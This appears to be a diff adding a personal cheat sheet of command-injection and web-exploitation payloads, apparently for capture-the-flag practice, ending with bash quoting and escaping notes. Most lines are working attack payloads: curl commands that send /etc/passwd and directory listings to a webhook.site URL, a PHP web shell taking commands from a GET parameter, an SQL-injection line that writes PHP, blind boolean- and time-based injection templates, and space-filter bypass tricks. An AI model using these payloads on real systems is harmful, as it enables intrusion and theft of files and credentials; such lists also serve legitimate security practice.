@@ -1,0 +1,59 @@
+concat/group_concat(0x3c,'?php ',' phpinfo(); ?',0x3e)
+google.com -d $(ls / -I "bin" -I "boot")
+google.com -d $(cat /3ef1cafd_secret.txt)
+
+ls / > /output.txt
+echo 'os.execute("cat /root/flag.txt")' > /tmp/a.lua
+curl -d @/output.txt https://webhook.site/54622bd8-cae3-4262-986d-441c42250814
+curl -d @/etc/passwd https://webhook.site/54622bd8-cae3-4262-986d-441c42250814
+curl --data $(ls /) https://webhook.site/54622bd8-cae3-4262-986d-441c42250814
+
+echo `ls /`           //`....` "   run code in "
+<?php die(`$_GET['cmd']`);?>; 
+echo $(ls /) >> /var/www/html/index.php
+cmd=sleep 5;
+cat /etc/passwd | head -n1 | cut -c4
+if [[ $VAR2 -ge $VAR3 ]]
+if [[ $(ls / |head -n1 | cut -c4) = 1 ]]; then sleep 3; fi;
+if [[ $(cut -c1 <<< $(cat /*.txt)) = 'C' ]] && echo 5
+DETERMINE = "; if [ $(cat /*.txt | head -n1 | cut -c{offset}) = '{so_sanh}' ]; then echo 'zip error'; fi ;" # BOOLEAN-BASED
+DETERMINE = "; if [ $(cat /*.txt | head -n1 | cut -c{offset}) = '{so_sanh}' ]; then sleep 3; fi ;" # TIME-BASED
+; if [ $(cat /*.txt | head -n1 | cut -c1) = 'C' ]; then echo 'a'; fi ;
+case "$sheng" in "nguqua") echo dungvai;;"ok") echo sairoi;;
+for file in /{usr/}bin/*calc} ;do if [ -x "$file" ]; then echo $file; fi;done;
+
+echo${IFS}1           //${IFS} bypass space
+%09 tab thay dau cach
+%0a newline \n
+cu%5c%0arl
+{ls,-la}      bash shell
+/bin/bash -c "ls -la"
+touch file-{1..5}.txt
+use  \'  is uselesss
+
+"$(ls /)"     "`ls /`"
+\" is enable, but \' 
+variable1="a variable containing five words"
+"$variable1"   -->  "This is a variable containing five words"
+$variable1     -->  "This" "is" "a" "variable" "containing" "five" "words"   7 argument
+
+File.read,File.open()    |cat etc/passwd   --> RCE
+IFS='\'
+echo $var        # '(] {}$"     \ converted to space. Why?
+echo "$var"      # '(]\{}$"
+is not occur with " "
+echo -e "Geeks \rfor Geeks"    --> permit \r work
+echo -e "\042"    -->   ASCII 42
+echo $'\a'    replace for  -e option
+echo "\\"  # Results in \
+
+echo foo\
+bar     # Newline escaped.
+#foobar
+echo "foo\
+bar"     # Same here, as \ still interpreted as escape within weak quotes.
+#foobar
+echo 'foo\
+bar'     # Escape character \ taken literally because of strong quoting.
+#foo\
+#bar
